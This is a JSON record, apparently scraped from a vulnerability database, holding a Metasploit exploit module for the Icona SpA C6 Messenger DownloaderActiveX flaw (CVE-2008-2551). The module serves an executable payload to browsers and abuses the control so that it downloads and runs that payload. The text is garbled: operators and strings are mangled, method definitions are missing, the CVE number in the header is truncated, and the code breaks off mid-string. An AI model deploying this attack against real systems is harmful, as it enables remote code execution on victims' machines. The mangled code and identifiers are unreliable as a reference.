{
    "text": "vul_name : Icona SpA C6 Messenger Downloader Arbitrary File Download / Execute ， vul_cve : CVE-2008-255 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : EXE ， super ( update_info ( info ,  ， 'Name' => 'Icona SpA C6 Messenger DownloaderActiveX Control Arbitrary File Download and Execute' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in Icona SpA C6 Messenger 1.0.0.1. The ， vulnerability is in the DownloaderActiveX Control ( DownloaderActiveX.ocx ) . The ， insecure control can be abused to download and execute arbitrary files in the context of ， the currently logged-on user. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Nine : Situations : Group : SnoopyAssault' ,  # Vulnerability discovery and exploit ， 'juan vazquez' # metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2008-2551' ]  ,  ，  [ 'OSVDB' , '45960' ]  ,  ，  [ 'BID' , '29519' ]  ,  ，  [ 'URL' , ' ]  ,  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'ExitFunction' => \"none\" ,  ， 'InitialAutoRunScript' => 'migrate -f' ， } ,  ， 'Payload' => ， { ， 'Space' => 2048 ,  ， 'StackAdjustment' => -3500 ,  ， } ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , { } ]  ,  ，  ]  ,  ， 'DisclosureDate' => 'Jun 03 2008' ,  ， 'DefaultTarget' => 0 ,  ， 'Privileged' => false )  ， end ， def autofilter ， false ， end ， def check_dependencies ， use_zlib ， end ，  # Only IEs are potential targets ，  # \"File Session\" is used when the ActiveX tries to request the EXE ， agent = request.headers [ 'User-Agent' ]  ， print_error ( \"Target not supported :  # {cli.peerhost} :  # {cli.peerport} (  # {agent} ) \" )  ， end ， payload_url = \" ， payload_url += ( datastore [ 'SRVHOST' ] = '0.0.0.0' ) ? Rex : Socket.source_address ( cli.peerhost )  : datastore [ 'SRVHOST' ]  ， payload_url += \" : \" + datastore [ 'SRVPORT' ] + get_resource (  ) + \"/ # { @ payload_rand}\" ， data = generate_payload_exe ( { : code => p.encoded } )  ， print_status ( \"Sending EXE payload to # {cli.peerhost} :  # {cli.peerport}.\" )  ， send_response ( cli , data , { 'Content-Type' => 'application/octet-stream' } )  ， end ， exe = rand_text_alpha ( rand ( 5 ) + 1 )  ， content = %Q | ",
    "time": "2012.02.04"
}